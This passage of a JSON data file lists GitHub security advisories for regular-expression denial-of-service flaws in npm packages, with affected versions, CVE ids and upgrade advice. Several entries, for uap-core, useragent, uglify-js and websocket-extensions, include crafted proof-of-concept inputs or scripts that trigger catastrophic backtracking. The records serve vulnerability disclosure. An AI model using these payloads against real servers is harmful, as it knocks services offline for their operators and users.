      "id": "GHSA-g78m-2chm-r7qv",
      "description": "### Impact\n\nThe ReDoS flaw allows an attacker to exhaust the server's capacity to process\nincoming requests by sending a WebSocket handshake request containing a header\nof the following form:\n\n    Sec-WebSocket-Extensions: a; b=\"\\c\\c\\c\\c\\c\\c\\c\\c\\c\\c ...\n\nThat is, a header containing an unclosed string parameter value whose content is\na repeating two-byte sequence of a backslash and some other character. The\nparser takes exponential time to reject this header as invalid, and this will\nblock the processing of any other work on the same thread. Thus if you are\nrunning a single-threaded server, such a request can render your service\ncompletely unavailable.\n\n### Patches\n\nUsers should upgrade to version 0.1.4.\n\n### Workarounds\n\nThere are no known work-arounds other than disabling any public-facing\nWebSocket functionality you are operating.\n\n### References\n\n- https://blog.jcoglan.com/2020/06/02/redos-vulnerability-in-websocket-extensions/",
      "summary": "Regular Expression Denial of Service in websocket-extensions (NPM package)",
      "date": "2020-06-05T16:16:12Z",
      "cve": "CVE-2020-7662",
      "year": 2020
   },
   {
      "package": {
         "raw": "minimist@0.2.4",
         "name": "minimist",
         "version": "0.2.4"
      },
      "id": "GHSA-7fhm-mqm4-2wp7",
      "description": "**Withdrawn**\nGitHub has withdrawn this advisory in place of GHSA-vh95-rmgr-6w4m and GHSA-6chw-6frg-f759.\nThe reason for withdrawing is that some mistakes were made during the ingestion of CVE-2020-7598\nwhich caused this advisory to be published with incorrect information.\n\nIn order to provide accurate advisory information, new advisories were created:\n\n- minimist: https://github.com/advisories/GHSA-vh95-rmgr-6w4m\n- acorn: https://github.com/advisories/GHSA-6chw-6frg-f759",
      "summary": "Withdrawn: ESLint dependencies are vulnerable (ReDoS and Prototype Pollution)",
      "date": "2020-03-13T20:36:16Z",
      "cve": null,
      "year": 2020
   },
   {
      "package": {
         "raw": "uap-core@0.7.2",
         "name": "uap-core",
         "version": "0.7.2"
      },
      "id": "GHSA-cmcx-xhr8-3w9p",
      "description": "### Impact\n\nSome regexes are vulnerable to regular expression denial of service (REDoS) due to overlapping capture groups. This allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to maliciously crafted long strings.\n\n### Patches\n\nPlease update uap-core to &amp;amp;gt;= v0.7.3\n\nDownstream packages such as uap-python, uap-ruby etc which depend upon uap-core follow different version schemes.\n\n### Details\n\nEach vulnerable regular expression reported here contains 3 overlapping capture groups. Backtracking has approximately cubic time complexity with respect to the length of the user-agent string.\n\n#### Regex 1:\n\n```\n\\bSmartWatch *\\( *([^;]+) *; *([^;]+) *;\n```\n\nis vulnerable in portion ` *([^;]+) *` and can be attacked with\n\n```python\n&amp;amp;quot;SmartWatch(&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\ne.g.\n```\nSmartWatch(                                   z\n```\n\n\n#### Regex 2:\n\n```\n; *([^;/]+) Build[/ ]Huawei(MT1-U06|[A-Z]+\\d+[^\\);]+)[^\\);]*\\)\n```\n\nis vulnerable in portion `\\d+[^\\);]+[^\\);]*` and can be attacked with\n\n```python\n&amp;amp;quot;;A Build HuaweiA&amp;amp;quot; + (&amp;amp;quot;4&amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\n\n\n#### Regex 3:\n\n```\n(HbbTV)/[0-9]+\\.[0-9]+\\.[0-9]+ \\([^;]*; *(LG)E *; *([^;]*) *;[^;]*;[^;]*;\\)\n```\n\nis vulnerable in portion ` *([^;]*) *` and can be attacked with\n\n```python\n&amp;amp;quot;HbbTV/0.0.0 (;LGE;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\n\n#### Regex 4:\n\n```\n(HbbTV)/[0-9]+\\.[0-9]+\\.[0-9]+ \\([^;]*; *(?:CUS:([^;]*)|([^;]+)) *; *([^;]*) *;.*;\n```\n\nis vulnerable in portions ` *(?:CUS:([^;]*)|([^;]+)) *` and ` *([^;]*) *` and can be attacked with\n\n```python\n&amp;amp;quot;HbbTV/0.0.0 (;CUS:;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n&amp;amp;quot;HbbTV/0.0.0 (;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n&amp;amp;quot;HbbTV/0.0.0 (;z;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\n\nReported by Ben Caller @bcaller",
      "summary": "Denial of Service in uap-core when processing crafted User-Agent strings",
      "date": "2020-02-20T23:26:10Z",
      "cve": "CVE-2020-5243",
      "year": 2020
   },
   {
      "package": {
         "raw": "lodash@4.17.10",
         "name": "lodash",
         "version": "4.17.10"
      },
      "id": "GHSA-x5rq-j2xg-h7qm",
      "description": "lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.",
      "summary": "Regular Expression Denial of Service (ReDoS) in lodash",
      "date": "2019-07-19T16:13:07Z",
      "cve": "CVE-2019-1010266",
      "year": 2019
   },
   {
      "package": {
         "raw": "underscore.string@3.3.4",
         "name": "underscore.string",
         "version": "3.3.4"
      },
      "id": "GHSA-v2p6-4mp7-3r9v",
      "description": "Versions of `underscore.string` prior to *3.3.5* are vulnerable to Regular Expression Denial of Service (ReDoS).\n\nThe function `unescapeHTML` is vulnerable to ReDoS due to an overly-broad regex. The slowdown is approximately 2s for 50,000 characters but grows exponentially with larger inputs.\n\n\n## Recommendation\n\nUpgrade to version 3.3.5 or higher.",
      "summary": "Regular Expression Denial of Service in underscore.string",
      "date": "2019-06-14T16:26:22Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "diff@3.4.0",
         "name": "diff",
         "version": "3.4.0"
      },
      "id": "GHSA-h6ch-v84p-w6p9",
      "description": "A vulnerability was found in diff before v3.5.0, the affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.",
      "summary": "Regular Expression Denial of Service (ReDoS)",
      "date": "2019-06-13T18:58:54Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "braces@2.3.0",
         "name": "braces",
         "version": "2.3.0"
      },
      "id": "GHSA-g95f-p29q-9xw4",
      "description": "Versions of `braces` prior to 2.3.1 are vulnerable to Regular Expression Denial of Service (ReDoS). Untrusted input may cause catastrophic backtracking while matching regular expressions. This can cause the application to be unresponsive leading to Denial of Service.\n\n\n## Recommendation\n\nUpgrade to version 2.3.1 or higher.",
      "summary": "Regular Expression Denial of Service in braces",
      "date": "2019-06-06T15:30:30Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "clean-css@4.1.10",
         "name": "clean-css",
         "version": "4.1.10"
      },
      "id": "GHSA-wxhq-pm8v-cw75",
      "description": "Version of `clean-css` prior to 4.1.11 are vulnerable to Regular Expression Denial of Service (ReDoS). Untrusted input may cause catastrophic backtracking while matching regular expressions. This can cause the application to be unresponsive leading to Denial of Service.\n\n\n## Recommendation\n\nUpgrade to version 4.1.11 or higher.",
      "summary": "Regular Expression Denial of Service in clean-css",
      "date": "2019-06-05T20:50:16Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "marked@0.6.1",
         "name": "marked",
         "version": "0.6.1"
      },
      "id": "GHSA-xf5p-87ch-gxw2",
      "description": "Versions of `marked` from 0.3.14 until 0.6.2 are vulnerable to Regular Expression Denial of Service. Email addresses may be evaluated in quadratic time, allowing attackers to potentially crash the node process due to resource exhaustion.\n\n\n## Recommendation\n\nUpgrade to version 0.6.2 or later.",
      "summary": "Marked ReDoS due to email addresses being evaluated in quadratic time",
      "date": "2019-06-05T14:10:03Z",
      "cve": null,
      "year": 2019
   },
   {
      "package": {
         "raw": "highcharts@5.0.15",
         "name": "highcharts",
         "version": "5.0.15"
      },
      "id": "GHSA-xmc8-cjfr-phx3",
      "description": "Versions of `highcharts` prior to 6.1.0 are vulnerable to Regular Expression Denial of Service (ReDoS). Untrusted input may cause catastrophic backtracking while matching regular expressions. This can cause the application to be unresponsive leading to Denial of Service.\n\n\n## Recommendation\n\nUpgrade to version 6.1.0 or higher.",
      "summary": "Regular Expression Denial of Service in highcharts",
      "date": "2019-03-18T15:59:32Z",
      "cve": "CVE-2018-20801",
      "year": 2018
   },
   {
      "package": {
         "raw": "tough-cookie@2.2.2",
         "name": "tough-cookie",
         "version": "2.2.2"
      },
      "id": "GHSA-qhv9-728r-6jqg",
      "description": "Affected versions of `tough-cookie` may be vulnerable to regular expression denial of service when long strings of semicolons exist in the `Set-Cookie` header.\n\n\n## Recommendation\n\nUpdate to version 2.3.0 or later.",
      "summary": "ReDoS via long string of semicolons in tough-cookie",
      "date": "2018-10-10T18:57:02Z",
      "cve": "CVE-2016-1000232",
      "year": 2016
   },
   {
      "package": {
         "raw": "protobufjs@6.8.5",
         "name": "protobufjs",
         "version": "6.8.5"
      },
      "id": "GHSA-762f-c2wg-m8c8",
      "description": "Versions of `protobufjs` before 5.0.3 and 6.8.6 are vulnerable to a regular expression denial of service when parsing crafted invalid *.proto files.\n\n\n## Recommendation\n\nUpdate to version 5.0.3, 6.8.6 or later.",
      "summary": "Denial of Service in protobufjs",
      "date": "2018-10-09T00:27:15Z",
      "cve": "CVE-2018-3738",
      "year": 2018
   },
   {
      "package": {
         "raw": "bson@1.0.4",
         "name": "bson",
         "version": "1.0.4"
      },
      "id": "GHSA-8462-q7x7-g2x4",
      "description": "The MongoDB bson JavaScript module (also known as js-bson) versions 0.5.0 to 1.0.x before 1.0.5 is vulnerable to a Regular Expression Denial of Service (ReDoS) in lib/bson/decimal128.js. The flaw is triggered when the Decimal128.fromString() function is called to parse a long untrusted string.",
      "summary": "js-bson vulnerable to REDoS",
      "date": "2018-09-17T20:44:58Z",
      "cve": "CVE-2018-13863",
      "year": 2018
   },
   {
      "package": {
         "raw": "mosca@2.8.1",
         "name": "mosca",
         "version": "2.8.1"
      },
      "id": "GHSA-wqg7-vrj7-v82h",
      "description": "This vulnerability allows remote attackers to deny service on vulnerable installations of npm mosca 2.8.1. Authentication is not required to exploit this vulnerability. The specific flaw exists within the processing of topics. A crafted regular expression can cause the broker to crash. An attacker can leverage this vulnerability to deny access to the target system.",
      "summary": "Mosca REDoS Vulnerability",
      "date": "2018-08-31T06:22:50Z",
      "cve": "CVE-2018-11615",
      "year": 2018
   },
   {
      "package": {
         "raw": "moment@2.11.1",
         "name": "moment",
         "version": "2.11.1"
      },
      "id": "GHSA-hxf5-mg84-pj4m",
      "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a \"regular expression Denial of Service (ReDoS).\"",
      "summary": "Moderate severity vulnerability that affects moment",
      "date": "2018-07-31T23:03:17Z",
      "cve": null,
      "year": 2018
   },
   {
      "package": {
         "raw": "hawk@3.1.2",
         "name": "hawk",
         "version": "3.1.2"
      },
      "id": "GHSA-jcpv-g9rr-qxrc",
      "description": "Versions of `hawk` prior to 3.1.3, or 4.x prior to 4.1.1 are affected by a regular expression denial of service vulnerability related to excessively long headers and URI's.\n\n\n\n## Recommendation\n\nUpdate to hawk version 4.1.1 or later.",
      "summary": "Regular Expression Denial of Service in hawk",
      "date": "2018-07-31T22:52:00Z",
      "cve": "CVE-2016-2515",
      "year": 2016
   },
   {
      "package": {
         "raw": "useragent@2.1.12",
         "name": "useragent",
         "version": "2.1.12"
      },
      "id": "GHSA-pjmx-9xr3-82qr",
      "description": "Affected versions of `useragent` are vulnerable to regular expression denial of service when an arbitrarily long `User-Agent` header is parsed.\n\n\n## Proof of Concept\n```js\nvar useragent = require('useragent');\n\nvar badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';\nvar request = 'GET / HTTP/1.1\\r\\nUser-Agent: ' + badUserAgent + '\\r\\n\\r\\n';\nconsole.log(useragent.parse(request));\n```\n\n\n## Recommendation\n\nUpdate to version 2.1.13 or later.",
      "summary": "ReDoS via long UserAgent header in useragent",
      "date": "2018-07-24T19:59:13Z",
      "cve": "CVE-2017-16030",
      "year": 2017
   },
   {
      "package": {
         "raw": "ua-parser@0.3.5",
         "name": "ua-parser",
         "version": "0.3.5"
      },
      "id": "GHSA-pmg9-p9r2-6q87",
      "description": "Affected versions of `ua-parser` are vulnerable to regular expression denial of service when given a specially crafted `User-Agent` header.\n\n\n## Recommendation\n\nNo patch is currently available for this vulnerability.\n\nThe best mitigation is currently to avoid using this package, using a different, functionally equivalent package such as [useragent](https://www.npmjs.com/package/useragent).",
      "summary": "ReDoS via long UserAgent header in ua-parser",
      "date": "2018-07-24T19:46:37Z",
      "cve": "CVE-2017-16086",
      "year": 2017
   },
   {
      "package": {
         "raw": "ssri@5.2.1",
         "name": "ssri",
         "version": "5.2.1"
      },
      "id": "GHSA-325j-24f4-qv5x",
      "description": "Version of `ssri` prior to 5.2.2 are vulnerable to regular expression denial of service (ReDoS) when using strict mode.\n\n\n## Recommendation\n\nUpdate to version 5.2.2 or later.",
      "summary": "Regular Expression Denial of Service in ssri",
      "date": "2018-03-07T22:22:20Z",
      "cve": "CVE-2018-7651",
      "year": 2018
   },
   {
      "package": {
         "raw": "aws-lambda-multipart-parser@0.1.1",
         "name": "aws-lambda-multipart-parser",
         "version": "0.1.1"
      },
      "id": "GHSA-6jqp-j69q-pm62",
      "description": "index.js in the aws-lambda-multipart-parser NPM package before 0.1.2 has a Regular Expression Denial of Service (ReDoS) issue via a crafted multipart/form-data boundary string.",
      "summary": "AWS Lambda parser is vulnerable to Regular Expression Denial of Service",
      "date": "2018-03-05T19:16:56Z",
      "cve": "CVE-2018-7560",
      "year": 2018
   },
   {
      "package": {
         "raw": "marked@0.3.7",
         "name": "marked",
         "version": "0.3.7"
      },
      "id": "GHSA-crmx-v835-hcp4",
      "description": "# Withdrawn\n\nThis advisory has been withdrawn, per NVD: [\"This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue.\"](https://nvd.nist.gov/vuln/detail/CVE-2017-17461)\n\n# Original Description\n\nA Regular expression Denial of Service (ReDoS) vulnerability in the file marked.js of the marked npm package (tested on version 0.3.7) allows a remote attacker to overload and crash a server by passing a maliciously crafted string.",
      "summary": "Moderate severity vulnerability that affects marked",
      "date": "2018-01-04T21:04:09Z",
      "cve": "CVE-2017-17461",
      "year": 2017
   },
   {
      "package": {
         "raw": "marked@0.3.3",
         "name": "marked",
         "version": "0.3.3"
      },
      "id": "GHSA-hjcp-j389-59ff",
      "description": "Versions 0.3.3 and earlier of `marked` are affected by a regular expression denial of service ( ReDoS ) vulnerability when passed inputs that reach the `em` inline rule.\n\n\n\n## Recommendation\n\nUpdate to version 0.3.4 or later.",
      "summary": "Regular Expression Denial of Service in marked",
      "date": "2017-10-24T18:33:36Z",
      "cve": "CVE-2015-8854",
      "year": 2015
   },
   {
      "package": {
         "raw": "semver@4.3.1",
         "name": "semver",
         "version": "4.3.1"
      },
      "id": "GHSA-x6fg-f45m-jf5q",
      "description": "Versions 4.3.1 and earlier of `semver` are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.\n\n\n\n## Recommendation\n\nUpdate to version 4.3.2 or later",
      "summary": "Regular Expression Denial of Service in semver",
      "date": "2017-10-24T18:33:36Z",
      "cve": "CVE-2015-8855",
      "year": 2015
   },
   {
      "package": {
         "raw": "uglify-js@2.5.0",
         "name": "uglify-js",
         "version": "2.5.0"
      },
      "id": "GHSA-c9f4-xj24-8jqx",
      "description": "Versions of `uglify-js` prior to 2.6.0 are affected by a regular expression denial of service vulnerability when malicious inputs are passed into the `parse()` method.\n\n\n### Proof of Concept\n\n```\nvar u = require('uglify-js');\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\nu.parse(\"var a = \" + genstr(process.argv[2], \"1\") + \".1ee7;\");\n```\n\n### Results\n```\n$ time node test.js 10000\nreal\t0m1.091s\nuser\t0m1.047s\nsys\t0m0.039s\n\n$ time node test.js 80000\nreal\t0m6.486s\nuser\t0m6.229s\nsys\t0m0.094s\n```\n\n\n## Recommendation\n\nUpdate to version 2.6.0 or later.",
      "summary": "Regular Expression Denial of Service in uglify-js",
      "date": "2017-10-24T18:33:36Z",
      "cve": "CVE-2015-8858",
      "year": 2015
   }
]